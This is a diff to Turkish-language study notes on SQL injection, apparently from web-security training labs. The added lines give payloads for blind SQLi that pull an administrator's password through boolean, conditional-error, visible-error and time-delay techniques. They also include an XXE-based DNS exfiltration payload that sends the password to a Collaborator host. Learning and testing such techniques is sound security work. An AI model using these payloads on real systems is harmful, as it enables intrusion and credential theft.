@@ -53,6 +53,7 @@ password: herhangi bir şey
 | Yorum | `-- -` veya `#` | `--` | `--` | `--` | `--` |
 | String concat | `CONCAT()` | `+` | `\|\|` | `\|\|` | `\|\|` |
 | Dual tablosu | gereksiz | gereksiz | `FROM dual` **şart** | gereksiz | gereksiz |
+| SUBSTR | `SUBSTRING` | `SUBSTRING` | `SUBSTR` | `SUBSTRING` | `SUBSTR` |
 | Tablo keşfi | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` | `sqlite_master` |
 
 ## Oracle Özel
@@ -152,22 +153,79 @@ Hedef: tablo adını bilmiyorsun, sütun adlarını bilmiyorsun → hepsini adı
 8. String column detection: `' UNION SELECT 'test',NULL--` → hangi sütun string kabul ediyor
 9. Data retrieval from users: `' UNION SELECT username,password FROM users--`
 10. Multiple values in single column: `' UNION SELECT NULL,username||'~'||password FROM users--`
-11. Blind SQLi conditional responses: TrackingId cookie + `SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a` + "Welcome back" farkı → Python script ile otomatize
+11. Blind SQLi conditional responses: TrackingId cookie + `SUBSTRING(...),1,1)='a` + "Welcome back" farkı → Python script ile otomatize
+12. Blind SQLi conditional errors: `CASE WHEN (SUBSTR(...)) THEN TO_CHAR(1/0) ELSE '' END FROM dual` → 500 vs 200 sinyal
+13. Visible error-based SQLi: `CAST((SELECT password FROM users LIMIT 1) AS int)` → hata mesajında veri sızıyor, brute force gereksiz
+14. Blind SQLi time delays: `pg_sleep(10)` → response süresinden sinyal (PostgreSQL)
+15. Blind SQLi time delays + info retrieval: `%3B` stacked query + `CASE WHEN ... THEN pg_sleep(5)` ile karakter karakter
+16. Out-of-band (teori): XXE + EXTRACTVALUE ile DNS exfiltration — Burp Pro gerekli
 
-## Blind SQLi (Boolean-Based)
+## Blind SQLi — 5 Teknik
 
-Sorgu sonucu ekranda görünmüyor, hata da yok. Sayfadaki bir fark (örn. "Welcome back" yazısı) üzerinden evet/hayır sorusu soruyorsun.
+Sorgu sonucu ekranda görünmüyor. Farklı sinyallerle evet/hayır sorusu sorarak veri çıkarıyorsun.
+
+### 1. Boolean-Based (Sayfa farkı)
+
+Sayfadaki bir fark (örn. "Welcome back" yazısı) üzerinden doğru/yanlış.
 
 ```sql
--- 1) Doğru/yanlış farkını tespit et
+-- Doğru/yanlış farkını tespit et
 TrackingId=xyz' AND '1'='1    → "Welcome back" VAR (doğru)
 TrackingId=xyz' AND '1'='2    → "Welcome back" YOK (yanlış)
 
--- 2) Şifrenin ilk harfini bul
+-- Şifrenin ilk harfini bul
 xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
 
--- 3) Pozisyonu değiştirerek devam (2. harf, 3. harf...)
--- Elle yapmak yetersiz → Python script veya Burp Intruder ile otomatize et
+-- Pozisyonu değiştirerek devam → Python script veya Burp Intruder ile otomatize et
+```
+
+### 2. Error-Based / Conditional Errors (500 vs 200)
+
+Sayfa içeriği değişmiyor ama SQL hatası tetiklersen 500, tetiklemezsen 200 döner.
+
+```sql
+-- Oracle: CASE WHEN ile koşullu hata tetikleme
+xyz'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+-- Sinyal: 500 Internal Server Error = doğru karakter, 200 = yanlış
+-- TO_CHAR(1/0) → sıfıra bölme hatası → 500
+```
+
+### 3. Visible Error-Based (Hata mesajında veri sızıntısı)
+
+Hata mesajı detaylı gösteriliyorsa → CAST ile veriyi hata mesajına sızdır. Brute force gerekmez!
+
+```sql
+-- CAST ile tek istekte veri sızdırma
+xyz' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--
+-- Hata: "invalid input syntax for type integer: "s3cr3tp4ssw0rd""
+-- ⚠️ TrackingId'yi kısalt ki sorgu hata mesajına sığsın
+```
+
+### 4. Time-Based (Response süresi)
+
+Sayfa farkı yok, hata farkı yok. Tek sinyal: response süresi.
+
+```sql
+-- PostgreSQL: stacked query + pg_sleep
+xyz'%3BSELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
+-- ⚠️ Cookie'de ; ayırıcı → %3B kullan + raw Cookie header ile gönder
+-- Sinyal: 5+ saniye = doğru, anında = yanlış
+
+-- Oracle: DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
+-- MSSQL: WAITFOR DELAY '0:0:5'
+-- MySQL: SLEEP(5)
+```
+
+### 5. Out-of-Band / DNS Exfiltration (Teori)
+
+Sunucu cevap veremiyorsa (async, hata yok, zaman farkı yok) → DNS ile dışarıya veri sızdır.
+
+```sql
+-- Oracle: XXE + EXTRACTVALUE ile DNS lookup
+'||(SELECT EXTRACTVALUE(xmltype('<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR/">%xxe;]>'),'/l') FROM dual)||'
+-- DNS'te: s3cr3tp4ssw0rd.xxx.burpcollaborator.net
+-- ⚠️ Burp Professional gerekli (Collaborator)
 ```
 
 ## SQLite Özel
